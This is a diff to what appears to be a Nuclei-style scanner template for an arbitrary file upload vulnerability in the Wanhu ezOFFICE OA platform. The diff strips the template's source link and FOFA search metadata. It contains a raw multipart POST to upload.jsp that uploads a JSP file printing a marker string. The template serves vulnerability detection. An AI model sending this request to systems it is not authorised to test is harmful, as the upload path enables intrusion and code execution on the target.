@@ -3,12 +3,8 @@ info:
   name: 万户OA upload任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yntqkhgb34xsgn7x'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yntqkhgb34xsgn7x
-    fofa: app="万户ezOFFICE协同管理平台"
 http:
 - raw:
   - 'POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=abc HTTP/1.1
@@ -29,8 +25,6 @@ http:
     Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
 
 
-
-
     --b0d829daa06c13d6b3e16b0ad21d1eed
 
 
@@ -38,8 +32,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <%out.print("dudesuite");%>
